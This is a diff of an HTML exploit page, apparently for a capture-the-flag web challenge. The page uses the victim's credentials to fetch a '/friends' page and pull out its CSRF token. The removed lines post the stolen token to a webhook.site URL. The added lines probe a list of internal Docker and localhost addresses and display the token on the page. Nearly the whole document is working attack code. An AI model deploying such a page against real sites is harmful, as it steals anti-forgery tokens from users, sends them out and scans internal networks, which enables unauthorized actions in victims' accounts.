@@ -7,59 +7,106 @@
     <h1>Extracting CSRF Token...</h1>
     
     <script>
-        const WEBHOOK_URL = 'https://webhook.site/60b2c32b-f130-442d-9eca-da173d2d3634';
-        
-        // Function to send data to webhook
-        async function sendToWebhook(data) {
-            try {
-                await fetch(WEBHOOK_URL, {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                    },
-                    body: JSON.stringify(data)
-                });
-            } catch (error) {
-                console.log("Webhook error:", error.message);
-            }
-        }
-        
-        // Function to extract CSRF token only
         async function extractCSRFToken() {
-            try {
-                console.log("Fetching /friends page...");
+            // Try various possible URLs to find the Flask app
+            const possibleUrls = [
+                // Same network possibilities
+                'http://app:3000/friends',
+                'http://web:3000/friends', 
+                'http://flask:3000/friends',
+                'http://challenge:3000/friends',
                 
-                const response = await fetch('http://fnotes-web.ctf-chal.idek.team/friends', {
-                    credentials: 'include'
-                });
+                // Localhost variations
+                'http://localhost:3000/friends',
+                'http://127.0.0.1:3000/friends',
                 
-                const html = await response.text();
+                // If served from same origin
+                '/friends',
                 
-                // Parse HTML to extract CSRF token
-                const parser = new DOMParser();
-                const doc = parser.parseFromString(html, 'text/html');
-                
-                // Look for CSRF token in the form
-                const csrfInput = doc.querySelector('form[action="/friends/request"] input[name="csrf_token"]');
-                
-                if (csrfInput) {
-                    const csrfToken = csrfInput.value;
-                    console.log(csrfToken);
+                // Docker internal IPs (common ranges)
+                'http://172.17.0.1:3000/friends',
+                'http://172.18.0.1:3000/friends',
+                'http://172.19.0.1:3000/friends',
+                'http://172.20.0.1:3000/friends',
+            ];
+            
+            for (const url of possibleUrls) {
+                try {
+                    console.log(`Attempting: ${url}`);
                     
-                    // Send to webhook
-                    await sendToWebhook({
-                        csrf_token: csrfToken
+                    const response = await fetch(url, {
+                        credentials: 'include',
+                        mode: 'cors',
+                        headers: {
+                            'User-Agent': navigator.userAgent,
+                            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
+                        }
                     });
-                } else {
-                    console.log("CSRF token not found");
+                    
+                    console.log(`Response status for ${url}: ${response.status}`);
+                    
+                    if (response.ok) {
+                        const html = await response.text();
+                        console.log(`✓ Successfully fetched from: ${url}`);
+                        console.log(`Response length: ${html.length} characters`);
+                        
+                        // Parse HTML to extract CSRF token
+                        const parser = new DOMParser();
+                        const doc = parser.parseFromString(html, 'text/html');
+                        
+                        // Look for CSRF token in the specific form
+                        const csrfInput = doc.querySelector('form[action="/friends/request"] input[name="csrf_token"]');
+                        
+                        if (csrfInput) {
+                            const csrfToken = csrfInput.value;
+                            console.log(`✓ CSRF TOKEN FOUND: ${csrfToken}`);
+                            
+                            // Make it highly visible
+                            document.title = "SUCCESS:" + csrfToken;
+                            document.body.innerHTML = `
+                                <div style="background: lime; color: black; padding: 50px; font-size: 24px; text-align: center;">
+                                    <h1>CSRF TOKEN EXTRACTED!</h1>
+                                    <p style="font-family: monospace; word-break: break-all;">${csrfToken}</p>
+                                    <p>URL: ${url}</p>
+                                </div>
+                            `;
+                            
+                            return csrfToken; // Success!
+                        } else {
+                            console.log(`⚠ No CSRF token found in response from ${url}`);
+                            // Log what we did find
+                            const allForms = doc.querySelectorAll('form');
+                            console.log(`Found ${allForms.length} forms in the page`);
+                            
+                            const allInputs = doc.querySelectorAll('input[name*="csrf"], input[name*="token"]');
+                            console.log(`Found ${allInputs.length} inputs with csrf/token in name`);
+                        }
+                    } else {
+                        console.log(`✗ HTTP ${response.status} for ${url}`);
+                    }
+                } catch (error) {
+                    console.log(`✗ Failed ${url}: ${error.message}`);
                 }
-                
-            } catch (error) {
-                console.log("Error:", error.message);
             }
+            
+            console.log("❌ Failed to extract CSRF token from all attempted URLs");
+            document.body.innerHTML = `
+                <div style="background: red; color: white; padding: 50px; text-align: center;">
+                    <h1>FAILED TO FIND FLASK APP</h1>
+                    <p>None of the attempted URLs worked</p>
+                    <p>Check console for details</p>
+                </div>
+            `;
         }
+        
+        // Also log environment info
+        console.log("=== ENVIRONMENT INFO ===");
+        console.log("Current URL:", window.location.href);
+        console.log("User Agent:", navigator.userAgent);
+        console.log("Referrer:", document.referrer);
         
         // Start extraction
+        console.log("=== STARTING CSRF EXTRACTION ===");
         extractCSRFToken();
     </script>
 </body>
